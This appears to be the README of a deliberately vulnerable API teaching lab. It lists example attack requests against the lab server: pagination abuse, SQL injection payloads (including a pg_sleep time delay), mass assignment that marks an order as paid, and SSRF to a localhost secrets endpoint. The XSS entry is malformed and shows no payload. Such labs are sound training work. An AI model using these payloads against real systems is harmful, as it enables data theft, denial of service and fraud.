# API Threats Example 01

To run the example locally:

1. Clone the repository

2. `cd` into `challenges/example` 

3. Run `poetry install`

4. Run the server: `uvicorn server:server --reload`

Some endpoints are authenticated. To obtain an access token, visit
[apithreats.com/login](https://apithreats.com/login). After successful 
login, you'll see your access token. Use that to authorize your requests 
in the Swagger UI.

You can also follow along with examples on the web, by visiting
[apithreats.com/example_01/docs](https://apithreats.com/example_01/docs). 
Follow the same procedure to obtain an access token and authorize your requests.

## Attacks

### Pagination attacks

Big integer attack
```bash
GET /products?per_page=100000000
```

Scraping attack
```bash
GET /products?page=1000
```

Schema enumeration
```bash
GET /products?order_by=is_exclusive
```

Cause errors / unexpected behaviours
```bash
GET /products?per_page=-100
```

### SQL Injection

BOLA
```bash
GET /orders?status=' 1=1;--
```

Resource starvation
```bash
GET /orders?status=' and 3133=(select 3133 from pg_sleep(10));--
```

### Mass assignment

```bash
PUT /orders/{order_id}
-d '{"product_id": <product_id>, "amount": 10, "status": "paid"}'
```

### Server-side request forgery

```bash
GET /fetch-external-data?url=http://localhost:8000/example_01/secrets
```

### XSS

```bash
GET /localhost:8000/compnies
```
